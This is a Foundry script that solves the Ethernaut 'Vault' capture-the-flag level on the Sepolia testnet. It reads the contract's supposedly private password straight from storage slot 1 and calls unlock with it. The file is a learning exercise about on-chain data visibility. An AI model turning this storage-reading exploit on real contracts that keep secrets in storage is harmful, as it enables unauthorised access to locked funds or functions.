// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../../src/ethernaut/08.sol";

// forge script script/ethernaut/08.s.sol --rpc-url $SEPOLIA_RPC_URL --account PK1_SEPOLIA --sender <ADDRESS> --broadcast -vvvv
// cast call --rpc-url $SEPOLIA_RPC_URL 0x271bEEdF8b164875dBA5f23d4d01EF3938986a01 "locked()(bool)"

contract VaultScript is Script {
    Vault public vault = Vault(0x271bEEdF8b164875dBA5f23d4d01EF3938986a01);

    function run() public {
        // Read slot 1 (password) before broadcasting.
        bytes32 storedPassword = vm.load(address(vault), bytes32(uint256(1)));
        console.logBytes32(storedPassword);

        vm.startBroadcast();

        console.log("Vault locked before: ", vault.locked());
        vault.unlock(storedPassword);
        console.log("Vault locked after: ", vault.locked());

        vm.stopBroadcast();
    }
}
